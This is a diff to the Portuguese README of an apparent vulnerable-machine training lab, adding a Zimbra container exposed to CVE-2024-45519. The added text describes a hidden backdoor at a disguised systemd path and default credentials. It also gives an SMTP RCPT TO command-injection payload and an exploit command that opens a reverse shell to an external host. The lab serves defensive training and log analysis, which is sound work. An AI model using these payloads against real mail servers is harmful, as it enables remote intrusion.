@@ -11,6 +11,7 @@ O ambiente do laboratório consiste em:
 - **MAQ-1**: Windows Server 2022 Domain Controller com Active Directory vulnerável
 - **MAQ-2**: Aplicação web Laravel com falhas de segurança intencionais
 - **MAQ-3**: Infraestrutura Linux com configurações vulneráveis
+- **MAQ-4**: Zimbra Collaboration Suite vulnerável à CVE-2024-45519 (RCE via SMTP)
 
 ## Início Rápido
 
@@ -51,6 +52,13 @@ cd MAQ-3
 ./maquina3-setup.sh deploy
 ```
 
+#### MAQ-4 (Zimbra CVE-2024-45519)
+
+```bash
+cd MAQ-4
+./maquina4-setup.sh deploy
+```
+
 ### 3. Verificar Status
 
 ```bash
@@ -62,6 +70,9 @@ cd MAQ-2 && ./maquina2-setup.sh status
 
 # Status MAQ-3
 cd MAQ-3 && ./maquina3-setup.sh status
+
+# Status MAQ-4
+cd MAQ-4 && ./maquina4-setup.sh status
 ```
 
 ## Componentes
@@ -185,6 +196,57 @@ cd MAQ-3
 ./container-escape-demo.sh      # Demonstração de escape
 ```
 
+### MAQ-4 (Zimbra CVE-2024-45519)
+
+**Descrição**: Servidor Zimbra Collaboration Suite 8.8.15 vulnerável à CVE-2024-45519, uma vulnerabilidade crítica de Remote Code Execution (RCE) via SMTP.
+
+**Funcionalidades**:
+
+- Zimbra Collaboration Suite 8.8.15 GA
+- Servidor SMTP vulnerável (porta 25)
+- Interface web Zimbra (HTTP/HTTPS)
+- Console administrativo
+- Serviços de correio (POP3, IMAP, SMTP)
+- Backdoor stealth integrado para demonstração
+
+**Vulnerabilidades Configuradas**:
+
+- **CVE-2024-45519**: RCE via injeção de comandos no SMTP
+- Expansão de shell em campos RCPT TO
+- Execução de comandos como usuário zimbra
+- Backdoor stealth em `/usr/local/lib/systemd/system/.systemd-udevd`
+- Monitoramento automático via cron jobs
+
+**Acesso**:
+
+- **SMTP**: localhost:25 (vulnerável)
+- **Interface Web**: http://localhost:80, https://localhost:443
+- **Admin Console**: https://localhost:7071
+- **SSH**: localhost:22
+- **Credenciais**: root / zimbra123, analyst / password123
+
+**Comandos Úteis**:
+
+```bash
+cd MAQ-4
+./maquina4-setup.sh deploy      # Deploy completo
+./maquina4-setup.sh status      # Status dos serviços
+./maquina4-setup.sh stop        # Parar laboratório
+./maquina4-setup.sh clean       # Limpar ambiente
+```
+
+**Exploração**:
+
+```bash
+# Teste manual via telnet
+telnet 127.0.0.1 25
+RCPT TO: <"aabbb$(whoami)@test.com">
+
+# Exploit automatizado
+cd CVE-2024-45519
+python3 exploit.py 127.0.0.1 -p 25 -lh IP_EXTERNO -lp 4444
+```
+
 ## Logs e Monitoramento
 
 ### Logs Expostos para Análise
@@ -214,6 +276,14 @@ cd MAQ-3
 - Samba: `logs/samba/`
 - Aplicação: `logs/app/`
 - Comandos: `logs/commands/`
+
+**MAQ-4**:
+
+- Sistema: Logs do container Docker
+- Zimbra: Logs de instalação e serviços
+- SMTP: Logs de conexões e comandos
+- Backdoor: Logs de execução de comandos
+- Cron: Logs de monitoramento automático
 
 ### Coleta de Logs
 
@@ -248,6 +318,16 @@ Os logs são expostos via volumes Docker para permitir coleta por agentes de mon
 - Container escape via Docker socket
 - Exploitação de capabilities Linux
 
+### Ataques de Serviços de Correio (MAQ-4)
+
+- **CVE-2024-45519**: Remote Code Execution via SMTP
+- Injeção de comandos em campos SMTP
+- Expansão de shell em RCPT TO
+- Execução de comandos como usuário zimbra
+- Obtenção de shell reverso via SMTP
+- Análise de backdoors stealth
+- Monitoramento de cron jobs maliciosos
+
 ### Análise de Logs
 
 **MAQ-1 (Windows)**:
@@ -262,6 +342,13 @@ Os logs são expostos via volumes Docker para permitir coleta por agentes de mon
 - Identificação de padrões de ataque
 - Correlação de eventos
 - Análise de tráfego de rede
+
+**MAQ-4 (Zimbra)**:
+- Análise de logs SMTP para detecção de payloads maliciosos
+- Monitoramento de execução de comandos via backdoor
+- Análise de cron jobs suspeitos
+- Detecção de tentativas de RCE via CVE-2024-45519
+- Correlação de eventos de rede e sistema
 
 ## Reset do Ambiente
 
@@ -278,16 +365,19 @@ cd MAQ-2 && ./maquina2-setup.sh clean
 
 # MAQ-3
 cd MAQ-3 && ./maquina3-setup.sh clean
+
+# MAQ-4
+cd MAQ-4 && ./maquina4-setup.sh clean
 ```
 
 ### Reset Individual
 
 ```bash
 # Parar ambiente
-./maquina1-setup.sh stop    # ou maquina2-setup.sh stop ou maquina3-setup.sh stop
+./maquina1-setup.sh stop    # ou maquina2-setup.sh stop ou maquina3-setup.sh stop ou maquina4-setup.sh stop
 
 # Reiniciar ambiente
-./maquina1-setup.sh start   # ou maquina2-setup.sh start ou maquina3-setup.sh start
+./maquina1-setup.sh start   # ou maquina2-setup.sh start ou maquina3-setup.sh start ou maquina4-setup.sh start
 ```
 
 ## Configuração de Rede
@@ -297,12 +387,14 @@ cd MAQ-3 && ./maquina3-setup.sh clean
 - **MAQ-1**: 192.168.101.0/24 (rede Docker)
 - **MAQ-2**: 192.168.201.0/24 (rede Docker)
 - **MAQ-3**: 192.168.200.0/24 (rede Docker)
+- **MAQ-4**: 192.168.104.0/24 (rede Docker)
 
 ### Portas Principais
 
 - **MAQ-1**: 3389 (RDP), 8006 (Web Viewer), 5353 (DNS), 1389 (LDAP), 1445 (SMB)
 - **MAQ-2**: 80 (HTTP), 3306 (MySQL), 6379 (Redis)
 - **MAQ-3**: 2222 (SSH), 2121 (FTP), 139/445 (Samba)
+- **MAQ-4**: 25 (SMTP), 80 (HTTP), 443 (HTTPS), 22 (SSH), 7071 (Admin Console)
 
 ## Considerações de Segurança
 
@@ -347,6 +439,9 @@ docker network ls
 docker network rm lab-network    # MAQ-1
 docker network rm soc-network    # MAQ-2
 docker network rm maq3-network  # MAQ-3
+
+# MAQ-4
+docker network rm lab-network    # MAQ-4
 ```
 
 #### Problemas de Deploy
@@ -367,8 +462,14 @@ Se o ambiente se tornar instável:
 # Reset completo
 ./maquina1-setup.sh clean    # ou maquina2-setup.sh clean ou maquina3-setup.sh clean
 
+# MAQ-3
+./maquina3-setup.sh clean    # ou maquina3-setup.sh clean
+
+# MAQ-4
+./maquina4-setup.sh clean    # ou maquina4-setup.sh clean
+
 # Deploy novamente
-./maquina1-setup.sh deploy   # ou maquina2-setup.sh deploy ou maquina3-setup.sh deploy
+./maquina1-setup.sh deploy   # ou maquina2-setup.sh deploy ou maquina3-setup.sh deploy ou maquina4-setup.sh deploy
 ```
 
 ## Documentação
@@ -376,6 +477,7 @@ Se o ambiente se tornar instável:
 - [MAQ-1/README.md](MAQ-1/README.md) - Documentação completa do laboratório Windows Server 2022 DC
 - [MAQ-2/README.md](MAQ-2/README.md) - Documentação completa do laboratório Laravel
 - [MAQ-3/README.md](MAQ-3/README.md) - Documentação completa do laboratório Linux
+- [MAQ-4/README.md](MAQ-4/README.md) - Documentação completa do laboratório Zimbra CVE-2024-45519
 
 ## Contribuindo
 
@@ -402,4 +504,4 @@ Para problemas e perguntas:
 
 ---
 
-**Lab Vuln** - Ambiente de Treinamento de Segurança com Laboratórios MAQ-1 (Windows Server 2022 DC), MAQ-2 (Laravel) e MAQ-3 (Linux)
+**Lab Vuln** - Ambiente de Treinamento de Segurança com Laboratórios MAQ-1 (Windows Server 2022 DC), MAQ-2 (Laravel), MAQ-3 (Linux) e MAQ-4 (Zimbra CVE-2024-45519)
